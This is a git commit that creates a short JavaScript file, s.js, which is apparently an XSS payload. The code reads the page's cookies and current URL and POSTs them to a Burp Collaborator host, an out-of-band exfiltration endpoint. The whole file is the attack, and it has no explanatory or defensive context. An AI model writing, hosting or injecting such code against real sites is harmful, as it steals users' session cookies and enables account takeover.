83c19e240889c23b557ea4ee49c44d75d81bfed4
ninja202023 <126621504+ninja202023@users.noreply.github.com>
2023-02-28 21:37:22 +0000

    Create s.js

---
+++ s.js
@@ -0,0 +1,11 @@
+const url = "zjmn4h1a5m0duiy5970oyugjva10pp.burpcollaborator.net"
+const data = { cookies: document.cookie, url: window.location.href };
+
+fetch(url, {
+	method: "POST",
+	mode: "no-cors",
+	body: JSON.stringify(data),
+	headers: {
+		"Content-Type": "application/json"
+	}
+});
